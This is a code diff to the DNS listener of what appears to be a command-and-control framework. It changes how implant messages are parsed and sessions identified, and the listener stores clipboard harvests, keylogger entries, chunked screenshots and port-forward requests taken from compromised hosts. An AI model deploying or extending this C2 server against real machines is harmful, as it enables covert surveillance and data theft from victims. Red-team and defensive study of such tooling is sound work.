@@ -105,24 +105,27 @@ public class DNSEndpointEmulator extends C2Interface {
 
 					String[] args = data.split("<spl>");
 					String response;
-					if (args.length != 5) {
+					if (args.length != 5 && args.length != 6) {
 						response = "Invalid message";
 					} else {
-						if (Constants.DEBUG) {
-							System.out.println("DEBUG: UDP received payload: " + args[4]);
-						}
 						String hostname = args[0];
 						String username = args[1];
 						String pid = args[2];
 						String protocol = args[3];
-						String sessionUID = hostname + ":" + username + ":" + protocol;
-						Integer sessionId = io.getSessionId(sessionUID);
-						if (sessionId == null) {
-							sessionId = io.addSession(username, hostname, protocol);
+						
+						String message = null;
+						String daemonUID = null;
+						if(args.length == 5) {
+							message = args[4];
+						}else {//Is 6
+							daemonUID = args[4];
+							message = args[5];
 						}
-
-						if (args[4].startsWith("<portForward>")) {
-							String[] pfRequest = args[4].substring("<portForward>".length()).split("<pf>");
+						Integer sessionId = io.determineAndGetCorrectSessionId(hostname, username, protocol, daemonUID);
+						io.updateSessionContactTime(sessionId);
+						
+						if (message.startsWith("<portForward>")) {
+							String[] pfRequest = message.substring("<portForward>".length()).split("<pf>");
 							if (pfRequest.length != 2) {
 								response = "Invalid request";
 							} else {
@@ -152,14 +155,13 @@ public class DNSEndpointEmulator extends C2Interface {
 							} else {
 								response = "<control> No Command";
 							}
-							// System.out.println("Arg: -" + args[4] + "- on session id " + sessionId );
-							if (args[4].startsWith("<harvest>")) {
+							if (message.startsWith("<harvest>")) {
 								String baseDir = properties.getProperty(Constants.DAEMONLZHARVEST) + File.separator
 										+ hostname + pid + username;
 								Files.createDirectories(Paths.get(baseDir));
 								String file = "";
-								if (args[4].contains("<Clipboard>")) {
-									file = args[4].substring("<harvest><Clipboard>".length());
+								if (message.contains("<Clipboard>")) {
+									file = message.substring("<harvest><Clipboard>".length());
 									harvester.processHarvest("Clipboard", hostname, pid, username, file);
 								} else {
 									// TODO: Implement DNS generic harvest reception
@@ -168,21 +170,21 @@ public class DNSEndpointEmulator extends C2Interface {
 								if (Constants.DEBUG) {
 									System.out.println("DEBUG: UDP harvest payload: " + file);
 								}
-							} else if (args[4].startsWith("<keylogger>")) {
-								keylogger.writeEntry(hostname, args[4].substring("<keylogger>".length()));
-							} else if (args[4].startsWith("<screenshot>") && !args[4].contains("<final>")) {
-								String b64 = args[4].substring("<screenshot>".length());
+							} else if (message.startsWith("<keylogger>")) {
+								keylogger.writeEntry(hostname, message.substring("<keylogger>".length()));
+							} else if (message.startsWith("<screenshot>") && !message.contains("<final>")) {
+								String b64 = message.substring("<screenshot>".length());
 								screenshotBuffer = screenshotBuffer + b64;
 								// If we tell the client a normal "no command", it will be queued.
 								// Give special discard statement that can be ignored.
 								response = "<discard>";
-							} else if (args[4].startsWith("<screenshot>") && args[4].contains("<final>")) {
-								String b64 = args[4].substring("<screenshot><final>".length());
+							} else if (message.startsWith("<screenshot>") && message.contains("<final>")) {
+								String b64 = message.substring("<screenshot><final>".length());
 								ScreenshotHelper.saveScreenshot(screenshotBuffer + b64, hostname, username,
 										properties.getProperty(Constants.DAEMONLZHARVEST));
 								screenshotBuffer = "";
-							} else if (!args[4].contentEquals("<poll>")) {
-								io.sendIO(sessionId, args[4]);
+							} else if (!message.contentEquals("<poll>")) {
+								io.sendIO(sessionId, message);
 							}
 						}
 					}
